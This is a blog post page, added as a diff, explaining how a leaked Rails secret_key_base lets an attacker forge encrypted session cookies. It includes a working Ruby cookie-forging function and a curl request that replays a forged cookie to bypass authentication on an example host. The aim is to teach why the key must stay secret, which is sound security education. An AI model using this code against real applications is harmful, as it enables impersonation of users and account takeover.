@@ -1,0 +1,540 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Security On Rails: Hacking Sessions With Insecure Secret Key Base - Karol Galanciak - Ruby on Rails and Ember.js consultant</title>
+  <meta name="author" content="Karol Galanciak">
+
+  
+  <meta name="description" content="Karol Galanciak - Ruby on Rails and Ember.js consultant, building ambitious and high performant web applications.">
+
+  
+  <meta name="keywords" content="Ruby on Rails, Ember.js, PostgreSQL, JavaScript, Consulting, MVP, post MVP, legacy apps">
+
+  
+  
+
+  <meta property="og:title" value="Security On Rails: Hacking Sessions With Insecure Secret Key Base - Karol Galanciak - Ruby on Rails and Ember.js consultant" />
+  <meta property="og:description" value="Karol Galanciak - Ruby on Rails and Ember.js consultant, building ambitious and high performant web applications." />
+  <meta property="og:url" value="http://Azdaroth.github.io/blog/2016/04/24/security-on-rails-hacking-sessions-with-insecure-secret-key-base/" />
+  <meta property="og:type" content="website" />
+  
+  <meta property="og:site_name" content="Karol Galanciak - Ruby on Rails and Ember.js consultant"/>
+  <meta property="og:locale" content="en_US" />
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@Azdaroth">
+  <meta name="twitter:creator" content="@Azdaroth">
+  <meta name="twitter:title" content="Security On Rails: Hacking Sessions With Insecure Secret Key Base - Karol Galanciak - Ruby on Rails and Ember.js consultant">
+  <meta name="twitter:url" content="">
+  <meta name="twitter:description" content="Karol Galanciak - Ruby on Rails and Ember.js consultant, building ambitious and high performant web applications.">
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://Azdaroth.github.io/blog/2016/04/24/security-on-rails-hacking-sessions-with-insecure-secret-key-base">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Karol Galanciak - Ruby on Rails and Ember.js consultant" type="application/atom+xml">
+  <script type="application/ld+json">
+    {
+      "@context": "http://schema.org",
+      "@type": "BlogPosting",
+      "mainEntityOfPage": {
+        "@type":"WebPage",
+        "@id": "http://Azdaroth.github.io/blog/2016/04/24/security-on-rails-hacking-sessions-with-insecure-secret-key-base"
+      },
+      "headline": "Security On Rails: Hacking Sessions With Insecure Secret Key Base - Karol Galanciak - Ruby on Rails and Ember.js consultant",
+        "image": {
+        "@type": "ImageObject",
+        "url": "",
+        "height": 640,
+        "width": 1024
+      },
+      "datePublished": "2016-04-24",
+      "dateModified": "2018-06-12",
+      "author": {
+        "@type": "Person",
+        "name": "Karol Galanciak"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "Karol Galanciak",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://karolgalanciak.com/images/me_formal.jpg",
+          "width": 600,
+          "height": 60
+        }
+      },
+      "description": "Karol Galanciak - Ruby on Rails and Ember.js consultant, building ambitious and high performant web applications.",
+      "keywords": "Ruby on Rails, Ember.js, PostgreSQL, JavaScript, Consulting, MVP, post MVP, legacy apps"
+    }
+  </script>
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-42570582-1', 'auto');
+    ga('send', 'pageview');
+    ga('set', 'anonymizeIp', true);
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Karol Galanciak - Ruby on Rails and Ember.js consultant</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:Azdaroth.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">About Me</a></li>
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/test-driven-ember">Test-Driven Ember Book</a></li>
+  <li><a href="/presentations">Presentations</a></li>
+  <li><a href="/publications">Publications</a></li>
+  <li><a href="/open-source">Open Source</a></li>
+  <li><a href="/privacy-policy">Privacy Policy</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Security on Rails: Hacking Sessions With Insecure Secret Key Base</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-04-24T20:00:00+02:00" pubdate data-updated="true">Apr 24<span>th</span>, 2016</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>I was recently asked what is <code>secret key base</code> used for in Rails applications and why not secure value of it (or even worse - the public one!) creates a security issue. That was a really good question, I remember how it was a serious threat years ago, especially before introducing <code>secrets.yml</code> in Rails 4.1 - at that time by default <code>secret_token</code> initializer was generated and the secret key was directly stored there. The result was that in many open source projects secret key was publicly available creating a great <strong>security risk</strong>. Let&#8217;s take a look how exposed secret key base could be exploited.</p>
+
+
+
+
+<!--more-->
+
+
+
+
+<h2>Anatomy of possible attack</h2>
+
+
+
+
+<p>Imagine that <code>current_user</code> lookup in some application is performed like this:</p>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">current_user</span>
+</span><span class='line'>  <span class="vi">@current_user</span> <span class="o">||=</span> <span class="no">User</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">session</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">)</span> <span class="k">if</span> <span class="n">session</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">].</span><span class="n">present?</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<p>Using <code>user_id</code> for storing id of the logged in user seems like an obvious choice. If I knew the <code>secret key base</code>, I could try encrypting the following hash:</p>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">malicious_hash</span> <span class="o">=</span> <span class="p">{</span><span class="n">user_id</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span> <span class="n">session_id</span><span class="p">:</span> <span class="s2">&quot;123abc&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<p>and send carefully crafted cookie pretending that I&#8217;m logged in as the user with id 10! The question is: how would I do it? Ok, maybe I have a <code>secret key base</code>, but what exactly should be done with it? What are the necessary steps to generate such a cookie that will be successfully decrypted later by Rails application?</p>
+
+
+
+
+<p>I was browsing through Rails source code and here&#8217;s what I&#8217;ve come up with:</p>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">generate_encrypted_cookie</span><span class="p">(</span><span class="n">data_hash</span><span class="p">,</span> <span class="n">secret_key_base</span><span class="p">)</span>
+</span><span class='line'>  <span class="c1"># inspired by https://github.com/rails/rails/blob/v4.2.6/actionpack/test/dispatch/cookies_test.rb#L595 and https://github.com/rails/rails/blob/v4.2.6/actionpack/lib/action_dispatch/middleware/cookies.rb#L527</span>
+</span><span class='line'>  <span class="n">salt</span> <span class="o">=</span> <span class="s2">&quot;encrypted cookie&quot;</span> <span class="c1"># default value from Rails.application.config.action_dispatch.encrypted_cookie_salt</span>
+</span><span class='line'>  <span class="n">signed_salt</span> <span class="o">=</span> <span class="s2">&quot;signed encrypted cookie&quot;</span> <span class="c1"># default value from Rails.application.config.action_dispatch.encrypted_signed_cookie_salt</span>
+</span><span class='line'>  <span class="n">key_generator</span> <span class="o">=</span> <span class="ss">ActiveSupport</span><span class="p">:</span><span class="ss">:KeyGenerator</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">secret_key_base</span><span class="p">,</span> <span class="ss">iterations</span><span class="p">:</span> <span class="mi">1000</span><span class="p">)</span> <span class="c1"># based on https://github.com/rails/rails/blob/v4.2.6/railties/lib/rails/application.rb#L179</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">secret</span> <span class="o">=</span> <span class="n">key_generator</span><span class="o">.</span><span class="n">generate_key</span><span class="p">(</span><span class="n">salt</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sign_secret</span> <span class="o">=</span> <span class="n">key_generator</span><span class="o">.</span><span class="n">generate_key</span><span class="p">(</span><span class="n">signed_salt</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">encryptor</span> <span class="o">=</span> <span class="ss">ActiveSupport</span><span class="p">:</span><span class="ss">:MessageEncryptor</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">sign_secret</span><span class="p">,</span> <span class="ss">serializer</span><span class="p">:</span> <span class="no">JSON</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt_and_sign</span><span class="p">(</span><span class="n">data_hash</span><span class="p">)</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<p>This is basically how Rails handles encrypting the session data. The last thing we are missing is <code>session store key</code>, which is not really a secret value, you can get one simply by using <code>curl</code>:</p>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">curl</span> <span class="o">-</span><span class="n">I</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">hack</span><span class="o">-</span><span class="n">me</span><span class="o">.</span><span class="n">dev</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<p>And one of the headers will be in the following format:</p>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Set</span><span class="o">-</span><span class="ss">Cookie</span><span class="p">:</span> <span class="n">_HackMe_session</span><span class="o">=</span><span class="n">asj7dli45a43f8rjm67djst</span><span class="p">;</span> <span class="n">path</span><span class="o">=</span><span class="sr">/; secure; HttpOnly</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<p><code>_HackMe_session</code> is our missing puzzle. Let&#8217;s try creating encrypted cookie based on our <code>malicious_hash</code> and exposed <code>secret_key_base</code>:</p>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='irb'><span class='line'><span class="go">generate_encrypted_cookie(malicious_hash, secret_key_base)</span>
+</span><span class='line'><span class="go">=&gt; &quot;dU9WQzF5RzVXdGNOcks1NGlMd3pTcTZINVdvYVNtampxZndUR2E2MmpZeTZ4MjFrWnYwKzJ3T1ladVdla250ci0tY1oxQkdnWUcrUWprZTZsMnZTbGdoUT09--b6dfdafc2456fb174239deb428fdee80a0cfe8f3&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<p>Assuming that there is some page requiring authentication which redirects to login page if user is not logged in, there are 2 possible scenarios: either user is authenticated and 200 HTTP code is returned or user is redirected with 302 status. To pretend that we are logged in we could perform the following request:</p>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='irb'><span class='line'><span class="go">curl -I http://hack-me.dev/page-requiring-authentication --cookie &quot;_HackMe_session=dU9WQzF5RzVXdGNOcks1NGlMd3pTcTZINVdvYVNtampxZndUR2E2MmpZeTZ4MjFrWnYwKzJ3T1ladVdla250ci0tY1oxQkdnWUcrUWprZTZsMnZTbGdoUT09--b6dfdafc2456fb174239deb428fdee80a0cfe8f3&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<p>As a result you should see <code>HTTP/1.1 200 OK</code>, which means you&#8217;ve successfully bypassed authentication :).</p>
+
+
+
+
+<h2>Wrapping up</h2>
+
+
+
+
+<p>As you now know, having secure and securely stored <code>secret key base</code> is an essential thing for the security of the app. Rails applications are now much more secure by default than it used to be and seems that accidentally exposing <code>secret key base</code> is not likely to happen. Nevertheless, it is still a very important thing to be aware of.</p>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Karol Galanciak</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-04-24T20:00:00+02:00" pubdate data-updated="true">Apr 24<span>th</span>, 2016</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/rails/'>Rails</a>, <a class='category' href='/blog/categories/ruby-on-rails/'>Ruby on Rails</a>, <a class='category' href='/blog/categories/security/'>Security</a>
+  
+</span>
+
+
+    </p>
+    <div class="meta top-line">
+      <div class="post-subscription">
+  <div id="mc_embed_signup">
+    <div id="mc_embed_signup_scroll">
+      <label for="mce-EMAIL">Do you want to take your developer skills to the next level? Subscribe to my newsletter and never miss another blog post!</label>
+      <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
+      <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_62804f1b69c60e0c7966cddd6_7c71fb81df" tabindex="-1" value=""></div>
+      <div class="clear">
+      <a href="http://eepurl.com/duztq5" target="_blank" id="mc-embedded-subscribe" class="button">Yes, I want to be a better developer!</a>
+    </div>
+  </div>
+</div>
+
+    </div>
+    <div class="top-line">
+      
+        <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://Azdaroth.github.io/blog/2016/04/24/security-on-rails-hacking-sessions-with-insecure-secret-key-base/" data-via="Azdaroth" data-counturl="http://Azdaroth.github.io/blog/2016/04/24/security-on-rails-hacking-sessions-with-insecure-secret-key-base/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+      
+    </div>
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2016/02/20/postgresql-in-action-sorting-with-nullif-expression/" title="Previous Post: PostgreSQL In Action: Sorting With NULLIF Expression">&laquo; PostgreSQL In Action: Sorting With NULLIF Expression</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2016/05/06/when-validation-is-not-enough-postgresql-triggers-for-data-integrity/" title="Next Post: When validation is not enough: PostgreSQL triggers for data integrity">When validation is not enough: PostgreSQL triggers for data integrity &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>About Me</h1>
+  <img class="left" src="/images/me_formal.jpg" title="me:)" alt="Karol Galanciak - photo">
+  <p>Hi, my name is Karol Galanciak, I'm a technical polyglot and domain expert in vacation rental and fitness industries.</p>
+
+  <p>I specialize in building APIs, microservices architecture, working with legacy applications, building ambitious Single Page Applications and building payment processors for credit cards processing. Currently I'm working as CTO at <a href="https://www.bookingsync.com" target="_blank">BookingSync</a>.</p>
+
+  <p id="email-me"></p>
+</section>
+
+<script type="text/javascript">
+  (function(d, id, lhs, rhs) {
+    d.getElementById(id).innerHTML = "You can reach me at <a rel='nofollow' href='mailto:" + lhs + "@" + rhs + "'>" + lhs + "@" + rhs + "</a>";
+  })(window.document, 'email-me', 'karol.galanciak', 'gmail.com');
+</script>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/27/the-case-for-before-validation-callback-complex-state-normalization/">The Case for Before_validation Callback: Complex State Normalization</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/04/28/advanced-ember-data-customization-different-model-types-in-ember-app-and-api-for-the-same-resource/">Advanced Ember Data Customization - Different Model Types in Ember App and API for the Same Resource</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/03/27/exotic-ruby-module-dot-class-exec-and-liquid-drops-in-action/">Exotic Ruby: Module.class_exec, Custom JSON and Liquid Drops in Action</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/02/25/rails-quick-tips-temporarily-disabling-touching-with-activerecord-dot-no-touching/">Rails Quick Tips: Temporarily Disabling Touching With ActiveRecord.no_touching</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/01/30/postgresql-quick-tips-working-with-dates-using-extract-function/">PostgreSQL Quick Tips: Working With Dates Using EXTRACT Function</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/Azdaroth">@Azdaroth</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'Azdaroth',
+            count: 6,
+            skip_forks: false,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+<section>
+   <h1>Twitter</h1>
+   <a class="twitter-timeline" href="https://twitter.com/Azdaroth" data-widget-id="357234540634329088">Tweets by @Azdaroth</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+
+</section>
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Karol Galanciak -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'karolgalanciak';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://Azdaroth.github.io/blog/2016/04/24/security-on-rails-hacking-sessions-with-insecure-secret-key-base/';
+        var disqus_url = 'http://Azdaroth.github.io/blog/2016/04/24/security-on-rails-hacking-sessions-with-insecure-secret-key-base/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'https://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
